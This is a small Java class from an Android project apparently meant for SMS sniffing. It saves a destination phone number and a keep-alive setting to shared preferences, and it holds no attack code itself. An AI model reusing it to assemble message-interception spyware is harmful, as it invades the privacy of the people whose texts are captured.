package sms.sniff.utils;

import sms.sniff.core.Constants;
import android.content.Context;
import android.content.SharedPreferences.Editor;

public class SharedPreferencesEditor {
	
	private Editor editor;

	public SharedPreferencesEditor(Context context) {
		editor = context.getSharedPreferences(Constants.sharedPreferences_Filename, 0).edit();
	}

	public void register(String phone) {
		editor.putString(Constants.sharedPreferences_destination, phone);
		editor.commit();
	}
	
	public void keepAlive(boolean value) {
		editor.putBoolean(Constants.sharedPreferences_keepAlive, value);
		editor.commit();
	}
}
